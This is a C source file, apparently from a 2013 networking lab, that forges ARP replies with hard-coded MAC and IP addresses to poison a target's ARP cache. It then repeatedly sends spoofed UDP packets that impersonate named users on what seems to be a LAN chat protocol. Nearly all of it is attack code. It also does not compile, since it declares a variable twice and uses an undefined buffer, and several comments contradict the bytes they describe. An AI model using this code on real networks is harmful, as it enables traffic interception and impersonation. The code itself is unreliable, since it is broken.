/* ************************************************************************
 *       Filename:  dns_attack.c
 *    Description:  
 *        Version:  1.0
 *        Created:  2013年12月28日 04时33分24秒
 *       Revision:  none
 *       Compiler:  gcc
 *         Author:  YOUR NAME (), 
 *        Company:  
 * ************************************************************************/


#include <stdio.h>
unsigned char arp_msg[1024] = {
//-------------combination mac------ 0 ~ 13 -----------
0xc8, 0x9c, 0xdc, 0xba, 0xaa, 0xca,	//det_mac: ff:ff:ff:ff:ff:ff
0x00, 0x0c, 0x29, 0x4d, 0x0a, 0x02,	//src_mac: 00:0c:29:4d:0a:02
0x08, 0x06,							//type: 0x0806 ARP argeement
//-------------combination ARP------ 14 ~ 41 ----------		
0x00, 0x01, 0x08, 0x00,				//hardware_type: 1, agreement_type: 0x0800(IP)
0x06, 0x04, 0x00, 0x02,				//hardware_length: 6, agreement_length: 4, option:(1:ARP_ask, 2:ARP_answer, 3:RARP_ask, 4:RARP_answer)
0x00, 0x0c, 0x29, 0x4d, 0x0a, 0x02,	//send_src_mac: 00:0c:29:4d:0a:02
10, 220, 0, 11,					//send_src_ip: 10.220.4.32	192.168.253.8
0x00, 0x0c, 0x29, 0x4d, 0x0a, 0x02,//target_mac: c8:9c:dc:ba:aa:ca
10, 220, 4, 31,				//target_ip: 10.220.4.31	
};

	
unsigned char ask_msg[1024] = {
//-------------combination mac------ 0 ~ 13 -----------
0x00, 0x02, 0xa5, 0x4f, 0x56, 0xa1,	//det_mac: 	10.220.0.11		00.02.a5.4f.56.a1
0xc8, 0x9c, 0xdc, 0xba, 0xaa, 0xca,	//src_mac: 	10.220.4.31		c8.9c.dc.ba.aa.ca
0x08, 0x00,							//type: 0x0806 ARP argeement	0x0800 IP argeement
//-------------combination IP------ 14 ~ 41 ----------		
0x45, 0x00, 0x00, 0x00,				//
0x00, 0x00, 0x00, 0x00,				//
0x80, 0x11, 0x00, 0x00, 			//128, UDP, checksum
10, 220, 4, 31,						//src_ip
10, 220, 5, 37,						//dst_ip
};
unsigned char answer_msg[1024] = {
//-------------combination mac------ 0 ~ 13 -----------
0xc8, 0x9c, 0xdc, 0xba, 0xaa, 0xca,	//det_mac: 10.220.4.31
0x00, 0x0c, 0x29, 0x4d, 0x0a, 0x0c,	//src_mac: 00:0c:29:4d:0a:02
0x08, 0x00,							//type: 0x0806 ARP argeement
//-------------combination ARP------ 14 ~ 41 ----------		
0x45, 0x00, 0x00, 0x00,				//hardware_type: 1, agreement_type: 0x0800(IP)
0x00, 0x00, 0x00, 0x00,				//hardware_length: 6, agreement_length: 4, option:(1:ARP_ask, 2:ARP_answer, 3:RARP_ask, 4:RARP_answer)
0x80, 0x11, 0x00, 0x00,				//128, UDP, checksum
10, 220, 5, 254,					//src_ip: 10.220.4.32
10, 220, 5, 37,						//dst_ip: 10.220.4.31
0x00, 0x35, 0x0c, 0xd6, 
0x00, 0x3c, 0xff, 0x95,
};

void send_arp(void)
{
/*
	int temp; 
	temp = recv_msg[34];
	recv_msg[34] = recv_msg[35];
	recv_msg[35] = temp; 
*/
	
	//--------arp应答---------------------------------------
	int sock_raw_fd0 = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	struct sockaddr_ll sll0;						//barbarism sockfd addr
	struct ifreq ethreq0;						//network interface addr	
	int sock_raw_fd0 = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	strncpy(ethreq0.ifr_name, "eth0", IFNAMSIZ);	//appointed name for network card
	if(-1 == ioctl(sock_raw_fd0, SIOCGIFINDEX, (char *)&ethreq0))
	{
		perror("ioctl");
		close(sock_raw_fd0);
		exit(-1);
	}
	bzero(&sll0, sizeof(sll0));
	sll0.sll_ifindex = ethreq0.ifr_ifindex;
	sendto(sock_raw_fd0, arp_msg, 42, 0, (struct sockaddr *)&sll0, sizeof(sll0));
}

#include <stdio.h>
#include <libnet.h>
int main(int argc, char *argv[])
{
	send_arp();
	char send_msg[1024] = "";
	char err_buf[512] = "";
	libnet_t *lib_net = NULL;
	int lens = 0;
	libnet_ptag_t lib_t = 0;
	unsigned char src_mac[6] = {0x00, 0x0c, 0x29, 0x4d, 0x0a, 0x02};//32	虚拟机mac
	unsigned char dst_mac[6] = {0xc8, 0x9c, 0xdc, 0xba, 0xaa, 0xca};//31	目标mac
//	unsigned char dst_mac[6] = {0x74, 0x27, 0xea, 0x55, 0x1f, 0xd2};//156
//	unsigned char dst_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};//255
//	unsigned char dst_mac[6] = {0x74, 0x27, 0xea, 0x54, 0xcc, 0xe5};//19
//	unsigned char dst_mac[6] = {0x74, 0x27, 0xea, 0x56, 0x1e, 0x07};//101
//	unsigned char dst_mac[6] = {0x10, 0x78, 0xd2, 0xce, 0x5c, 0x75};//13	

	char *src_ip_str = "10.220.4.32";	//伪装者ip
	char *dst_ip_str = "10.220.4.31";	//目标ip
//	char *dst_ip_str = "10.220.4.156";
//	char *dst_ip_str = "10.220.4.255";
//	char *dst_ip_str = "10.220.4.19";
//	char *dst_ip_str = "10.220.4.101";
//	char *dst_ip_str = "10.220.4.13";
	unsigned long src_ip = 0, dst_ip = 0;
//1_lbt6_11#128#7427EA54CCE5#0#0#0#4000#9	吴险
//1_lbt6_31#128#1078D2CE5C75#0#0#0#4000#9	王猛

//	lens = sprintf(send_msg, "1_lbt6_11#128#7427EA54CCE5#0#0#0#4000#9:%d:%s:%s:%d:%s",\
					12345, "吴险", "EDU-D05", 209, "大家干啥呢？");
	lens = sprintf(send_msg, "1_lbt6_11#128#7427EA54CCE5#0#0#0#4000#9:%d:%s:%s:%d:%s",\
					12345, "吴险", "EDU-D05", 209, "大家干啥呢？");
	lib_net = libnet_init(LIBNET_LINK_ADV, "eth0", err_buf);
	if(NULL == lib_net)
	{
		perror("libnet_init");
		exit(-1);
	}
	src_ip = libnet_name2addr4(lib_net, src_ip_str, LIBNET_RESOLVE);
	dst_ip = libnet_name2addr4(lib_net, dst_ip_str, LIBNET_RESOLVE);
//源端口，目的端口，udp长度，校验和（设为0，自动填充），负载（发送的数据，可以为NULL），负载长度，句柄，协议标记
	lib_t = libnet_build_udp(recv_msg[35], recv_msg[34], 8 + lens, 0, send_msg, lens, lib_net, 0);	
//ip包总长度，服务类型，id标识，片偏移，生成时间，上层协议，校验和，源ip地址，目的ip地址，负载（ip报头中的选项），负载长度，句柄，协议标记
	lib_t = libnet_build_ipv4(20 + 8 + lens, 0, 500, 0, 128, 17, 0,\
							src_ip, dst_ip, NULL, 0, lib_net, 0);
//目的mac，源mac，上层协议类型，负载（附带的数据），负载长度，句柄，协议标记
	lib_t = libnet_build_ethernet((u_int8_t *)dst_mac, (u_int8_t *)src_mac,\
								ETHERTYPE_IP, NULL, 0, lib_net, 0);
								
	while(1)
	{
		libnet_write(lib_net);
		sleep(3);
	}
	libnet_destroy(lib_net);

	return 0;
}

